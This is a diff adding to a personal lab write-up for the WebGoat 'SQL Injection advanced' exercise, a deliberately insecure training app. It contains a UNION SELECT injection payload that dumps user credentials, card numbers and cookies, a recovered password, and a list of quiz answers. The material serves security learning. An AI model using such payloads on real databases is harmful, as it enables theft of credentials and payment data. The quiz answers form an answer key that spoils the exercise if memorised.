@@ -107,6 +107,31 @@ I tried to enter the credentials on WebGoat and the connection worked!
 
 ----
 <a name="webgoat2"></a>
-# WebGoat: SQL Injection (advanced)
+# WebGoat: SQL Injection advanced (Voluntary) 
 ## [Source](https://owasp.org/www-project-webgoat/#:~:text=WebGoat%20is%20a%20deliberately%20insecure,and%20popular%20open%20source%20components.)
 
+### Try it! Pulling data from other tables
+
+    6.a) Name: '; SELECT userid, first_name, last_name, cc_number, cc_type, cookie, login_count FROM user_data 
+    UNION SELECT userid, user_name, password, cookie, null, null, null FROM user_system_data;--
+    # I decided to "forgot" the first request, by adding the ';
+    # So, I created a SELECT for the first table user_data that can retrieve all the data.
+    # Then, I added to the first select a UNION SELECT. This second SQL query take all the fields of the table user_system_data.
+    # It is also important to note that I added some null in the SQL query. (Same number of fields for the both queries)
+    
+    6.b) Password: Dave's password is passW0rD.
+
+<p align="center"> <img alt="WebGoat Pulling data" src="https://github.com/MatthieuBruh/h3_Attaaack/blob/main/screenshots/WebGoat_PullingData.PNG"> </p>
+
+### Login as Tom
+
+    # After many attempts, I was unable to log in as a TOM.
+
+### Quiz
+1. Answer: 4
+2. Answer: 3
+3. Answer: 2
+4. Answer: 3
+5. Answer: 4
+
+<p align="center"> <img alt="WebGoat Quiz" src="https://github.com/MatthieuBruh/h3_Attaaack/blob/main/screenshots/WebGoat_QuizPNG.PNG"> </p>
